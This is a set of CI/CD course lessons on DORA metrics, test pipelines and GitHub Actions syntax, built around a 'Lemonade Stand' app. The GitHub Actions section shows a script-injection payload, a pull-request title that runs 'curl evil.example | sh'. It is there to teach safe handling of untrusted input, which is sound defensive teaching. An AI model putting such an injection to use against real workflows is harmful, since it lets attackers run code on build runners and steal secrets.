title: Measuring Delivery with DORA
text:
After two months of CI/CD, the shop owner asks: “Are we actually better now?” Opinions differ. Ana feels faster; Ben worries that more deployments mean more breakages. Without numbers, the team argues in circles.
They need a small set of measurements that show both speed (how quickly changes reach customers) and stability (how often those changes hurt customers), and a rule for when to slow down.






TipExplain it like I’m ten



A school report card does not have one grade. It has a few subjects, so you can see what you are good at and what needs work. DORA (DevOps Research and Assessment) made a report card for software teams after surveying tens of thousands of people over many years. Nicole Forsgren, Jez Humble and Gene Kim explain it in the book Accelerate (2018).
The surprising finding: teams that are fast are usually also steady. Like a good bike rider, going at a sensible speed makes you more stable, not less. Small, frequent changes are both quicker and safer than big, rare ones.
Error budget. Imagine your parents say: “This month you may be late for dinner 40 minutes in total.” Being late sometimes is fine, but once the 40 minutes are used up, you must come home early for the rest of the month. Google’s Site Reliability Engineering book calls this an error budget: a service may fail a little, and when the allowance is spent, the team stops taking risks and fixes reliability first.
A warning. The economist Charles Goodhart noticed that numbers stop telling the truth once people are rewarded for them. The anthropologist Marilyn Strathern put it as: “When a measure becomes a target, it ceases to be a good measure.” Use these numbers to learn, not to grade people.

title: Measuring Delivery with DORA
text:
Rules and conventions

Measure the team’s system, never individuals.
Use medians for times; a few slow changes should not hide the typical case.
Count only production deployments for frequency and failure rate.
Agree on what “failed” means before measuring (for example: needed a rollback or hotfix within 24 hours).
Look at speed and stability together; improving one by wrecking the other is not progress.
Set an SLO with the business, and write down what happens when the error budget runs out.
Review the numbers monthly and pick one thing to improve.

title: Measuring Delivery with DORA
text:
Mathematical Abstraction
Let \(\mathcal{D}\) be the set of production deployments in a window of \(W\) days, and \(\mathcal{F} \subseteq \mathcal{D}\) the failed ones. For a deployment \(d\), let \(c_d\) be the commit time and \(p_d\) the time it went live.

1. Deployment frequency
\[
\text{DF} = \frac{|\mathcal{D}|}{W}
\]
where \(|\mathcal{D}|\) is the number of production deployments, \(W\) is the window length in days, and DF is deployments per day.
Example. \(\text{DF} = \frac{12}{30} = 0.40\) per day, which is \(0.40 \times 7 = 2.8\) per week.


2. Change lead time
\[
\text{LT} = \operatorname{median}_{d \in \mathcal{D}} \left( p_d - c_d \right)
\]
where \(p_d - c_d\) is how long deployment \(d\)’s commit waited before going live (hours), and the median is the middle value after sorting (for an even count, the average of the two middle values).
Example. Sorted lead times: \(1, 2, 2, 3, 3, \mathbf{4}, \mathbf{4}, 5, 6, 8, 26, 50\). There are 12 values, so the median is the average of the 6th and 7th: \(\frac{4 + 4}{2} = 4\) hours. The mean would be \(\frac{114}{12} = 9.5\) hours, pulled up by D4 and D8; that is why the median is used.


3. Change fail rate
\[
\text{CFR} = \frac{|\mathcal{F}|}{|\mathcal{D}|}
\]
where \(|\mathcal{F}|\) is the number of deployments that needed immediate intervention.
Example. D5 and D9 failed: \(\text{CFR} = \frac{2}{12} = 0.167 = 16.7\%\).


4. Failed deployment recovery time
\[
\text{FDRT} = \operatorname{median}_{d \in \mathcal{F}} \left( r_d - f_d \right)
\]
where \(f_d\) is when the failure of deployment \(d\) was detected and \(r_d\) is when service was restored (minutes).
Example. Recovery times \(12\) and \(25\) minutes; two values, so the median is \(\frac{12 + 25}{2} = 18.5\) minutes.


5. Deployment rework rate
\[
\text{DRR} = \frac{|\mathcal{U}|}{|\mathcal{D}|}
\]
where \(\mathcal{U} \subseteq \mathcal{D}\) is the set of unplanned deployments made because of a production incident.
Example. Only the hotfix D10: \(\text{DRR} = \frac{1}{12} = 0.083 = 8.3\%\).


6. Error budget
\[
B = (1 - S) \cdot T
\]
where

\(S\) is the SLO as a fraction (for example \(0.999\) for 99.9%);
\(T\) is the length of the window in minutes;
\(B\) is the error budget: the minutes of failure the SLO allows in that window.

Example. \(S = 0.999\) over 30 days: \(T = 30 \times 24 \times 60 = 43{,}200\) minutes, so
\[
B = (1 - 0.999) \times 43{,}200 = 0.001 \times 43{,}200 = 43.2 \text{ minutes.}
\]
November’s two failures cost \(12 + 25 = 37\) minutes (assuming the stand was fully down while they lasted), so the team spent \(\frac{37}{43.2} = 85.6\%\) of the budget and has \(43.2 - 37 = 6.2\) minutes left. Their error-budget policy says: above 75% spent, only bug fixes and reliability work ship until the month ends.

title: Automated Testing in the Pipeline
text:
A pipeline is only as good as the checks inside it. The Lemonade team hits three problems in one week:

Slow feedback. Someone adds a browser test that clicks through the menu page. It takes 8 minutes, and it runs before the 1-second unit tests, so a typo takes 8 minutes to report.
A flaky test. One test sometimes fails because it waits a fixed 50 ms for the server to start. People start clicking “Re-run” without reading the failure.
Merging on red. Ben’s pull request is red, but nothing stops him from pressing “Merge”.

This lesson fixes all three: the right mix of tests, the right order, trustworthy tests, and rules that make the pipeline’s verdict count.






TipExplain it like I’m ten



The test pyramid. Imagine building a LEGO castle. You check that each brick is not broken: lots of quick checks. Then you check that a few bricks clicked together make a solid wall: fewer checks. Finally you check that the whole castle stands up: only a few slow checks, because building the whole castle takes ages. Lots of small tests at the bottom, a few big ones at the top: that shape is a pyramid. Mike Cohn drew it in his book Succeeding with Agile (2009), and Ham Vocke explains it with real code in The Practical Test Pyramid (2018).
Flaky tests. Remember the boy who cried wolf? He shouted “Wolf!” when there was no wolf, so when a real wolf came, nobody listened. A flaky test is a smoke alarm that goes off whenever you make toast: soon everyone ignores it, and then a real fire is ignored too. Martin Fowler’s Eradicating Non-Determinism in Tests compares such tests to an infection that can ruin a whole test suite, and explains how to cure them.

title: Automated Testing in the Pipeline
section: A worked example: three stages for the Lemonade Stand
text:
A worked example: three stages for the Lemonade Stand
The pipeline runs the cheapest check first. Each job needs the one before, so a failure stops everything after it:
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: node --check server.mjs
  test:
    needs: lint
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: node --test --experimental-test-coverage --test-coverage-lines=80 --test-coverage-exclude='*.test.mjs'
  container-smoke:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: |
          docker build -t lemonade:ci .
          docker run -d -p 8080:8080 lemonade:ci
          curl --retry 10 --retry-connrefused --fail localhost:8080/health
The three stages run locally too. Here is the real output of each one, trimmed to the lines that matter:
$ node --check server.mjs && echo ok
ok

$ node --test
✔ adds up the price of every cup
✔ gives 10% off from the tenth cup
✔ rejects unknown drinks and bad quantities
✔ serves health, prices and 404 over HTTP
ℹ pass 4
ℹ fail 0

$ curl localhost:8080/health          # container started from the built image
{"status":"ok","version":"dev"}
The four Lemonade tests already form a pyramid: three unit tests of priceOrder and one integration test that talks HTTP. The container smoke test is the single E2E check at the top.

A quality gate that fails, and what it teaches
Ask Node for a stricter 90% line-coverage gate and the build goes red:
$ node --test --experimental-test-coverage --test-coverage-lines=90 --test-coverage-exclude='*.test.mjs'
ℹ Error: 85.11% line coverage does not meet threshold of 90%.
ℹ file       | line % | branch % | funcs % | uncovered lines
ℹ server.mjs |  85.11 |    86.96 |   71.43 | 36-37 43-47
The uncovered lines are the start-up block that only runs when the file is started directly, and a re-throw for unexpected errors. Writing tests just to touch them would add code without adding safety. That is the real lesson of coverage gates: a gate is a floor, not a goal. The Lemonade pipeline uses 80%, which catches a big untested feature without forcing silly tests.


Fixing the flaky test
The flaky version waited a fixed time before calling the server:
server.listen(8080);
await new Promise((r) => setTimeout(r, 50));   // flaky: 50 ms is sometimes too short
The fixed version waits for the event that means “ready”, and uses port 0 so the operating system picks a free port and two test runs never collide:
await new Promise((resolve) => server.listen(0, resolve));   // ready, on a free port
const base = `http://127.0.0.1:${server.address().port}`;
This is exactly what server.test.mjs does. The general rule from Fowler’s article: replace “wait and hope” with “wait for a signal”, and isolate tests from each other and from time.


Test results the pipeline can read
node --test --test-reporter=junit --test-reporter-destination=report.xml writes JUnit XML, the format most CI tools understand:
<testcase name="gives 10% off from the tenth cup" time="0.000072" classname="test" .../>

title: Automated Testing in the Pipeline
text:
Rules and conventions

Shape the suite like a pyramid: many unit tests, some integration tests, few E2E tests.
Order the pipeline by cost: lint → unit → integration → E2E.
Keep the commit stage (everything before the image build) under about 10 minutes.
A test must not depend on time, order, network luck or another test.
Quarantine a flaky test at once (skip it with a ticket), and fix or delete it within days.
Never “re-run until green” without reading the failure.
Make the important checks required in a ruleset; otherwise a red build is only advice.
Treat coverage as a floor that catches untested features, not as a score to maximise.

title: Automated Testing in the Pipeline
text:
Common mistakes








Mistake
Symptom
Fix




Ice-cream cone: mostly E2E, few unit tests
Pipeline takes 40 minutes; failures are vague
Push checks down to unit level


Slow tests first
A typo takes 8 minutes to report

Fixed sleeps in tests
Random failures under load

Tests pass alone, fail together
Fresh server, port 0, no global data

Red pull requests get merged

Renaming a required job
PRs wait forever for a check that never reports

Chasing 100% coverage
Tests that assert nothing useful

title: Automated Testing in the Pipeline
text:
Mathematical Abstraction

1. How flaky tests poison a suite
Assume each of \(n\) tests fails spuriously (with no real bug) with probability \(p\), independently. The chance that the whole suite is red for no reason is:
\[
P_{\text{false red}} = 1 - (1 - p)^n
\]
where

\(n\) is the number of tests in the suite;
\(p\) is the chance that one test fails without a real bug, per run (\(0 \le p \le 1\));
\((1-p)\) is the chance that one test behaves;
\((1-p)^n\) is the chance that all \(n\) tests behave (independence lets us multiply);
\(P_{\text{false red}}\) is the chance that at least one test fails spuriously.

Example. The Lemonade Stand grows to \(n = 500\) tests, and each is “only” a little flaky: \(p = 0.001\) (one bad run in a thousand).
\[
P_{\text{false red}} = 1 - 0.999^{500} = 1 - e^{500 \ln 0.999} \approx 1 - e^{-0.5003} \approx 1 - 0.606 = 0.394
\]
So about 39% of all builds would be red for no reason. That is how a team ends up ignoring red builds, which is the boy who cried wolf in numbers. Independence is a simplifying assumption; in practice flaky tests often fail together (for example when a runner is slow), which changes the number but not the lesson.


2. Why cheap checks go first
Run stages \(1, 2, \dots, k\) in order. Stage \(i\) takes \(t_i\) minutes and fails with probability \(f_i\); a failure skips everything after it. The expected time until the pipeline finishes or stops is:
\[
E[T] = \sum_{i=1}^{k} t_i \prod_{j=1}^{i-1} (1 - f_j)
\]
where

\(k\) is the number of stages;
\(t_i\) is the duration of stage \(i\) in minutes;
\(f_i\) is the probability that stage \(i\) fails;
\(\prod_{j=1}^{i-1} (1 - f_j)\) is the chance that every stage before \(i\) passed, so stage \(i\) runs at all (for \(i = 1\) the empty product is \(1\));
\(E[T]\) is the expected pipeline time in minutes.

Example. Lint \(t_1 = 0.5\), \(f_1 = 0.10\); unit tests \(t_2 = 2\), \(f_2 = 0.05\); E2E \(t_3 = 10\), \(f_3 = 0.02\) (illustrative numbers for a larger Lemonade Stand).
Cheap first (lint → unit → E2E):
\[
E[T] = 0.5 + 2(0.90) + 10(0.90)(0.95) = 0.5 + 1.8 + 8.55 = 10.85 \text{ minutes}
\]
Expensive first (E2E → unit → lint):
\[
E[T] = 10 + 2(0.98) + 0.5(0.98)(0.95) = 10 + 1.96 + 0.4655 \approx 12.43 \text{ minutes}
\]
Cheap-first saves about 1.6 minutes per run on average. More importantly, a lint failure is reported after 0.5 minutes instead of 10.5. (The model assumes stage failures are independent; when they are not, the ordering still usually wins.)

title: GitHub Actions Syntax
text:
The Lemonade team now knows the building blocks (Lesson 2). To use them they must write a workflow file that GitHub understands. YAML is unforgiving: one wrong indent and the workflow does not run, a typo in an expression silently evaluates to an empty string, and a missing needs lets the deploy run before the tests finish. This lesson is the reference they keep open while writing ci.yml.






TipExplain it like I’m ten



A workflow file is a chore chart for a robot. It says:

When to start: “when someone pushes to main” (on).
Which chores exist: “test”, “build”, “deploy” (jobs).
What order: “build only after test is finished” (needs).
How to do each chore, line by line (steps).
Special rules: “only deploy if it is main” (if), “never do two deploys at once” (concurrency).

The robot reads the chart exactly as written. It never guesses what you meant, so spelling and spacing matter. GitHub’s own Understanding GitHub Actions page draws the same picture: an event starts a workflow, which runs jobs, which run steps.

title: GitHub Actions Syntax
section: The anatomy of a workflow file
text:
The anatomy of a workflow file
A workflow is a YAML file in .github/workflows/. Its shape is always: top-level settings → on → jobs → steps.
name: CI                         # shown in the Actions tab
on:
  push:
    branches: [main]             # trigger
jobs:
  test:                          # job id (letters, digits, - and _)
    runs-on: ubuntu-latest       # runner
    steps:
      - uses: actions/checkout@v7    # an action
      - run: npm test                # a shell command
YAML rules you need: two spaces per indent level (never tabs); key: value for maps; - item for list items; [a, b] is a short list; a line ending in | starts a multi-line string. Quote strings that start with *, {, ! or @, because YAML gives those characters a special meaning.

title: GitHub Actions Syntax
text:
Top-level keys









Keyword
What it does
Rule / convention
Example




name
Workflow name in the UI
Short, unique per repo
name: CI


run-name
Title of each run; may use github and inputs
Put the variable part first
run-name: Deploy ${{ inputs.image }}


on
Events that start the workflow
Required
on: [push, pull_request]


permissions
Rights of the automatic GITHUB_TOKEN
Start with contents: read, add per job
permissions: { contents: read }


env
Environment variables for every job
Plain, non-secret values only
env: { NODE_ENV: test }


defaults
Default shell and working-directory for run steps
Use when code lives in a subfolder
defaults: { run: { working-directory: app } }


concurrency
Allows only one run per group at a time; add cancel-in-progress: true to stop the older run
Cancel stale pull-request runs; never cancel deploys
concurrency: ci-${{ github.ref }}


jobs
The jobs, keyed by job id
Required
jobs: { test: ... }

title: GitHub Actions Syntax
text:
Triggers: on









Keyword
What it does
Rule / convention
Example




push
Runs when commits or tags are pushed
Usually limit to main
push: { branches: [main] }


pull_request
Runs on pull-request activity, using the merge result
Default activity types: opened, synchronize, reopened
pull_request: { branches: [main] }


workflow_dispatch
Adds a “Run workflow” button, with typed inputs
Input types: string, boolean, number, choice, environment
workflow_dispatch: { inputs: { image: { type: string, required: true } } }


schedule
Runs on a timer (cron, UTC by default)
Only on the default branch; shortest interval 5 minutes; avoid minute 0
schedule: [{ cron: '17 3 * * *' }]


workflow_call
Makes this workflow reusable by other workflows
Declare inputs, secrets, outputs
workflow_call: { inputs: { environment: { type: string } } }


branches / branches-ignore
Filter by branch name (glob patterns)
Do not use both for one event; use !pattern inside branches
branches: [main, 'release/**']


tags / tags-ignore
Filter pushes by tag name
Good for release workflows
tags: ['v*.*.*']


paths / paths-ignore
Run only when matching files change
A skipped workflow reports no status
paths-ignore: ['**.md']


types
Pick activity types of an event
Default types differ per event
pull_request: { types: [opened, labeled] }



Cron in one minute. The five fields are minute hour day-of-month month day-of-week. '17 3 * * 1-5' means “at 03:17 UTC, Monday to Friday”. * means “every value”, 1-5 is a range, */15 is “every 15th”, 0,30 is a list. Quote the string, because a value starting with * is special in YAML.

title: GitHub Actions Syntax
text:
Job keys: jobs.<job_id>









Keyword
What it does
Rule / convention
Example




name
Display name (also the status-check name)
Keep it stable if it is a required check
name: Test on Node ${{ matrix.node }}


runs-on
Runner label
ubuntu-latest unless you need more
runs-on: ubuntu-latest


needs
Jobs that must succeed first
Gives access to needs.<id>.outputs
needs: [test, lint]


if
Run the job only when true
${{ }} optional, but required if it starts with !
if: github.ref == 'refs/heads/main'


environment
Deploy target; applies its protection rules and secrets
Name must match Settings → Environments
environment: production


outputs
Values exported to later jobs
Map each name to a step output
ref: ${{ steps.build.outputs.digest }} (under outputs:)


steps
The list of steps
Run top to bottom; stop at the first failure
steps: [ ... ]


timeout-minutes
Kill the job after this long
Default 360; set something realistic
timeout-minutes: 10


continue-on-error
A failure does not fail the workflow
Only for experimental jobs
continue-on-error: true


permissions
Token rights for this job only
Widen here, not at the top
permissions: { packages: write }


env / defaults
Same as top level, for one job
Job values override top-level ones
env: { PORT: 8080 }


concurrency
One run per group for this job
Use for deploy jobs
concurrency: deploy-production


strategy.matrix
Run the job once per combination of values
Max 256 jobs per run
matrix: { node: [24, 26] }


strategy.matrix.include
Add combinations, or extra keys to matching ones
Applied after exclude
include: [{ node: 26, coverage: true }]


strategy.matrix.exclude
Remove combinations
Must match a full or partial combination
exclude: [{ os: windows-latest, node: 24 }]


strategy.fail-fast
Cancel other matrix jobs when one fails
Default true; set false to see every result
fail-fast: false


strategy.max-parallel
Limit how many matrix jobs run at once
Default: as many as runners allow
max-parallel: 2


container
Run all steps inside this container image
Steps then see the container’s tools
container: node:26-alpine


services
Side containers (databases, caches) for the job
Reach them by label in a container job, or localhost with ports
services: { redis: { image: redis:8 } }


uses
Call a reusable workflow instead of steps
No steps or runs-on with it
uses: ./.github/workflows/deploy.yml


with / secrets
Inputs and secrets for that reusable workflow
secrets: inherit passes all
secrets: inherit

title: GitHub Actions Syntax
text:
Step keys: jobs.<job_id>.steps[*]









Keyword
What it does
Rule / convention
Example




name
Label in the log
Say what the step checks
name: Run unit tests


uses
Run an action
owner/repo@ref, ./local/path or docker://image
uses: actions/setup-node@v7


run
Run shell commands
End the line with a block-scalar bar for several lines, as in the anatomy example
run: npm test


with
Inputs for the action
Names come from the action’s action.yml
with: { node-version: 26 }


env
Variables for this step only
Pass secrets and untrusted text this way
TOKEN: ${{ secrets.TOKEN }} (under env:)


id
Names the step so others can read its outputs
Needed for steps.<id>.outputs
id: build


if
Run the step only when true
Use status functions for clean-up steps
if: failure()


shell
Which shell runs run
shell: bash adds -o pipefail
shell: bash


working-directory
Folder for run
Relative to the workspace
working-directory: app


continue-on-error
Let the job go on if this step fails
Rarely right; hides failures
continue-on-error: true


timeout-minutes
Kill this step after this long
For steps that may hang
timeout-minutes: 3

title: GitHub Actions Syntax
text:
Expressions: ${{ ... }}
Anything inside ${{ }} is evaluated by GitHub before the step runs; the result is pasted into the YAML. Literals are true, false, null, numbers and 'single-quoted strings'. String comparison ignores case.
if: github.event_name == 'push' && github.ref == 'refs/heads/main'
if: ${{ !cancelled() }}                      # starts with !, so ${{ }} is required
run: echo "${{ github.event_name == 'push' && 'deploy' || 'skip' }}"  # a ? b : c
Operators: ( ), [ ], ., !, <, <=, >, >=, ==, !=, && and ||. The pattern cond && a || b acts like “if cond then a else b” as long as a is not empty or false.

Contexts: where values come from









Context
What it holds
Rule / convention
Example




github
The event and repository: sha, ref, actor, event_name, repository, event
Fields from github.event can be attacker-controlled text
${{ github.sha }}


env
Variables set with env:
Not available in job-level if
${{ env.NODE_ENV }}


vars
Configuration variables (repo, org, environment)
For non-secret settings
${{ vars.LEMONADE_URL }}


secrets
Encrypted secrets, plus GITHUB_TOKEN
Masked in logs; empty in fork pull requests
${{ secrets.KUBECONFIG_B64 }}


inputs
workflow_dispatch or workflow_call inputs
Typed: booleans are real booleans
${{ inputs.environment }}


matrix
The current matrix combination
Only inside a matrix job
${{ matrix.node }}


strategy
Matrix bookkeeping: job-index, job-total
Rarely needed
${{ strategy.job-index }}


needs
Results and outputs of jobs in needs
needs.<id>.result is success, failure, cancelled or skipped
${{ needs.image.outputs.ref }}


steps
Outputs and results of earlier steps with an id
outcome is before continue-on-error, conclusion after
${{ steps.build.outputs.digest }}


runner
The machine: os, arch, temp
Use runner.temp for scratch files
${{ runner.os }}


job
The current job: status, container, services
Handy in clean-up steps
${{ job.status }}





Functions









Function
What it returns
Rule / convention
Example




success()
True if nothing before has failed or been cancelled
The default for every if
if: success()


failure()
True if an earlier step or needed job failed
For rollback and alerts
if: failure()


always()
Always true, even when cancelled
Prefer !cancelled() so a cancel really stops
if: always()


cancelled()
True if the run was cancelled
Usually used as !cancelled()
if: ${{ !cancelled() }}


contains(a, b)
Is b in string or array a?
Case-insensitive
contains(github.event.pull_request.labels.*.name, 'deploy')


startsWith(a, b)
Does a start with b?
Case-insensitive
startsWith(github.ref, 'refs/tags/v')


endsWith(a, b)
Does a end with b?
Case-insensitive
endsWith(github.repository, '-demo')


format(s, ...)
Fills {0}, {1} in s
Use {{ for a literal brace
format('lemonade-{0}', github.sha)


join(arr, sep)
Joins an array into a string
Default separator ,
join(matrix.tags, ' ')


toJSON(x)
Pretty JSON text of a value
Great for debugging
toJSON(github.event)


fromJSON(s)
Parses JSON text into a value
Turns text into booleans, numbers or a dynamic matrix
fromJSON(needs.plan.outputs.matrix)


hashFiles(p)
SHA-256 of the matching files, or '' if none
For cache keys
hashFiles('**/package-lock.json')

title: GitHub Actions Syntax
section: Environment files: talking back to the runner
text:
Environment files: talking back to the runner
A step cannot change the YAML, but it can write to special files whose paths GitHub puts in environment variables.









File variable
What writing to it does
Rule / convention
Example




GITHUB_OUTPUT
Sets a step output, read as steps.<id>.outputs.<name>
One name=value per line; step needs an id
echo "tag=v1.2.0" >> "$GITHUB_OUTPUT"


GITHUB_ENV
Sets an environment variable for later steps of the job
Not visible in the same step
echo "KUBECONFIG=$RUNNER_TEMP/kc" >> "$GITHUB_ENV"


GITHUB_PATH
Adds a folder to PATH for later steps
One folder per line
echo "$HOME/.local/bin" >> "$GITHUB_PATH"


GITHUB_STEP_SUMMARY
Adds Markdown to the run’s summary page
Keep it short and useful
echo "Deployed $IMAGE" >> "$GITHUB_STEP_SUMMARY"



Common read-only variables: GITHUB_SHA (commit), GITHUB_REF (for example refs/heads/main), GITHUB_REPOSITORY (owner/repo), GITHUB_WORKSPACE (checkout folder), RUNNER_TEMP (a scratch folder emptied after each job).

title: GitHub Actions Syntax
text:
Worked examples
Each snippet shows one idea from the Lemonade workflows.
A matrix. Test on two Node versions without copying the job:
test:
  runs-on: ubuntu-latest
  strategy:
    fail-fast: false
    matrix:
      node: [24, 26]
  steps:
    - uses: actions/checkout@v7
    - uses: actions/setup-node@v7
      with:
        node-version: ${{ matrix.node }}
    - run: npm test
Passing a value from a step, to a job output, to another job. This is exactly how ci.yml hands the image reference to the deploy jobs:
image:
  runs-on: ubuntu-latest
  outputs:
    ref: ${{ steps.name.outputs.repo }}        # 2. job output
  steps:
    - id: name
      run: echo "repo=ghcr.io/acme/lemonade-stand" >> "$GITHUB_OUTPUT"   # 1. step output
staging:
  needs: image
  runs-on: ubuntu-latest
  steps:
    - run: echo "Deploying ${{ needs.image.outputs.ref }}"              # 3. read it
Only deploy from main, and clean up even after a failure:
deploy:
  if: github.ref == 'refs/heads/main'
  steps:
    - run: kubectl -n lemonade rollout status deployment/lemonade-web
    - if: failure()
      run: kubectl -n lemonade rollout undo deployment/lemonade-web
Passing untrusted text safely. A pull-request title is written by whoever opened it. Never paste it straight into a script:
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Testing: $TITLE"          # safe: the shell sees a variable, not code
If you wrote run: echo "${{ github.event.pull_request.title }}" instead, a title such as "; curl evil.example | sh; echo " would become part of the script. This is called script injection.
The full, linted versions are ci.yml and deploy.yml. Both pass actionlint, a free linter for workflow files:
docker run --rm -v "$PWD:/repo" --workdir /repo rhysd/actionlint:latest -no-color
echo $?     # 0 means no problems found

title: GitHub Actions Syntax
text:
Rules and conventions

One workflow per purpose: ci.yml, deploy.yml, nightly.yml.
Set permissions: contents: read at the top; widen per job.
Pin actions to a major version (@v7) at minimum; security-sensitive teams pin full commit SHAs.
Set timeout-minutes on every job so a hang cannot burn six hours.
Put secrets and any user-controlled text into env:, then use "$VAR" in the shell.
Use concurrency to cancel stale pull-request runs, and to serialise deployments.
Keep name: of required checks stable; renaming one breaks branch protection.
Lint workflows with actionlint before pushing.

title: GitHub Actions Syntax
text:
Common mistakes








Mistake
Symptom
Fix




Tabs or wrong indentation
“Invalid workflow file” banner; nothing runs
Two spaces per level; run actionlint


Typo in a context, such as ${{ secret.TOKEN }}
Value is silently empty
actionlint flags unknown contexts


if: !cancelled() without ${{ }}
YAML error, because ! starts a YAML tag
if: ${{ !cancelled() }}


Writing to GITHUB_ENV and reading it in the same step
Variable is empty
Read it in the next step, or use a normal shell variable


Forgetting id on a step
steps.build.outputs.digest is empty
Add id: build


Schedule at 0 * * * *
Runs late or skipped at busy times
Pick an odd minute such as 17


Piping a command into tee without shell: bash
The step passes even though the first command failed, because the default shell has no pipefail
Add shell: bash, or set -o pipefail

title: GitHub Actions Syntax
text:
Mathematical Abstraction

Matrix size
A matrix with keys \(A_1, \dots, A_k\) creates one job per combination, the Cartesian product of their value lists, minus excluded combinations, plus new combinations from include:
\[
\lvert J \rvert = \prod_{i=1}^{k} \lvert A_i \rvert \; - \; \lvert X \rvert \; + \; \lvert I_{\text{new}} \rvert
\]
where

\(k\) is the number of matrix keys (for example os and node);
\(A_i\) is the list of values for key \(i\), and \(|A_i|\) is how many values it has;
\(\prod_{i=1}^{k}\) multiplies the counts together;
\(X\) is the set of combinations removed by exclude, and \(|X|\) its size;
\(I_{\text{new}}\) is the set of include entries that cannot be merged into any existing combination without overwriting one of its original values (the other entries only add keys and create no job);
\(|J|\) is the number of jobs GitHub starts (at most 256).

Example. os: [ubuntu-latest, windows-latest] and node: [24, 26], with exclude: [{os: windows-latest, node: 24}] and include: [{os: macos-latest, node: 26}]:
\[
\lvert J \rvert = (2 \times 2) - 1 + 1 = 4 - 1 + 1 = 4 \text{ jobs.}
\]


Waves with max-parallel
If \(m\) is max-parallel, the jobs run in waves:
\[
W = \left\lceil \frac{|J|}{m} \right\rceil
\]
where

\(m\) is the value of max-parallel (a whole number, \(m \ge 1\));
\(\lceil x \rceil\) rounds \(x\) up to the next whole number;
\(W\) is the number of waves.

Example. \(|J| = 4\) jobs and \(m = 3\): \(W = \lceil 4/3 \rceil = \lceil 1.33 \rceil = 2\) waves. If each matrix job takes 2 minutes, the matrix needs about \(2 \times 2 = 4\) minutes instead of 2 minutes with no limit.


How often a schedule fires
A cron field with a step, such as */15 in the minute position, fires \(60/s\) times an hour, so per day:
\[
R = \frac{60}{s} \times h
\]
where

\(s\) is the step in minutes (it must divide 60 evenly for this simple count, and \(s \ge 5\) on GitHub);
\(h\) is how many hours of the day match the hour field;
\(R\) is the number of runs per day.

Example. '*/15 8-17 * * *': \(s = 15\), and the hours 8 to 17 are \(h = 10\) hours, so \(R = \frac{60}{15} \times 10 = 4 \times 10 = 40\) runs per day.

title: Pipeline Building Blocks
text:
The Lemonade team agreed in Lesson 1 that “a robot should test and ship every change”. To tell the robot what to do, they need words for its parts. When should it start? Where does it run? What does it run, and in what order? How does the image built in one place reach the deploy step in another? Where does the cluster password live?
Every CI/CD tool (GitHub Actions, GitLab CI, Jenkins, CircleCI, Azure Pipelines) answers these questions with the same handful of building blocks. Learn them once and you can read any of these tools.






TipExplain it like I’m ten



Picture a restaurant kitchen making lemonade for a party.

The recipe card pinned on the wall is the workflow file.
The order bell that rings when a customer orders is the trigger.
Each cook at a station (one squeezes lemons, one mixes, one bottles) is a job. Cooks at different stations can work at the same time.
Each line on a cook’s card (“cut 10 lemons”, “add sugar”) is a step.
The kitchen itself, with its counters and tools, is the runner. After every order it is wiped completely clean.
The tray a cook passes to the next station is an artifact.
The pantry of lemons cut yesterday is the cache: it saves time, but you could always cut fresh ones.
The practice table for tasting and the real party table are environments (staging and production).
The locked drawer with the key to the party hall is where secrets live.
The thumbs-up or thumbs-down the head chef shows is the status check.

Jez Humble and David Farley call the whole line of stations a deployment pipeline: each station gives a bit more confidence, and a bottle only moves on if the station before it said yes. Martin Fowler summarises the idea in Deployment Pipeline.

title: Pipeline Building Blocks
text:
The building blocks, precisely









Keyword
What it does
Rule / convention
Example




Trigger (event)
Decides when a pipeline starts
Trigger on every push and pull request to the main branch
on: [push, pull_request]


Pipeline / workflow
The whole automated process, defined as a file in the repo
One file per purpose (CI, deploy, nightly)
.github/workflows/ci.yml


Stage
A group of jobs that logically belong together (test, build, deploy)
GitHub has no stage keyword; order comes from needs
test stage → build stage → deploy stage


Job
A set of steps that run on one runner, top to bottom
Jobs run in parallel unless needs orders them
jobs: test:


Step
One shell command or one reusable action inside a job
One clear purpose per step, with a name
- run: npm test


Action
A reusable, versioned step published by someone
Pin a major version or a full commit SHA
uses: actions/checkout@v7


Runner
The machine (VM or container) that executes a job
Prefer fresh, throw-away runners
runs-on: ubuntu-latest


Workspace
The folder on the runner where the repo is checked out
Never assume files survive to another job
$GITHUB_WORKSPACE


Artifact
A file produced by a job and kept after the job ends
Pass build outputs between jobs as artifacts or registry images
test report, built image


Cache
Saved files reused by later runs to go faster
A cache may be missing; the job must still work without it
~/.npm keyed by the lock file


Environment
A named deploy target with its own secrets and protection rules
One per target: staging, production
environment: production


Secret
An encrypted value (password, token, key) given to jobs
Never print it; scope it to the smallest place
secrets.KUBECONFIG_B64


Variable
A plain, non-secret setting
Config that differs per environment
vars.LEMONADE_URL


Status check
The ✔ or ✖ a job reports on a commit or pull request
Make important checks required before merging
“CI / test ✔”


Approval (gate)
A human must approve before a job continues
Use for production only
Required reviewers on production




Same ideas, different words: GitHub Actions and GitLab CI








Concept
GitHub Actions
GitLab CI




Pipeline file
.github/workflows/*.yml (many files)
.gitlab-ci.yml (one file, can include: others)

title: Pipeline Building Blocks
section: A worked example: the Lemonade pipeline as building blocks
text:
A worked example: the Lemonade pipeline as building blocks
Here is the shape of the Lemonade CI workflow, with only the lines that show the building blocks:
on: [push, pull_request]            # trigger
jobs:
  check-syntax:                     # job 1 (runs in parallel with job 2)
    runs-on: ubuntu-latest          # runner
    steps:
      - uses: actions/checkout@v7   # step: a reusable action
      - run: node --check server.mjs  # step: a shell command
  test:                             # job 2
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: npm test
  image:
    needs: [check-syntax, test]     # waits for both jobs above
    runs-on: ubuntu-latest
    steps:
      - run: echo "build and push the image here (Lesson 5)"
Three things to notice:

Jobs do not share a disk. check-syntax, test and image each get a fresh runner, so each one checks out the code again. Anything that must travel between jobs goes through an artifact, a registry, or a job output.
needs turns the job list into a graph. Without needs, all three jobs start at once. With it, image starts only after both of its parents succeed.
A failed job stops its children. If test fails, image is skipped, and the pull request shows a red ✖. That red cross is the andon cord from Lesson 1.

You can run each step’s command locally to see that it is real:
cd devops/ci-cd/examples/lemonade-stand
node --check server.mjs && echo "syntax ok"   # prints: syntax ok
npm test                                      # ℹ pass 4  ℹ fail 0

Runners: who owns the kitchen?









Runner type
What it is
When to use
Example




GitHub-hosted
A fresh VM created for each job and deleted afterwards
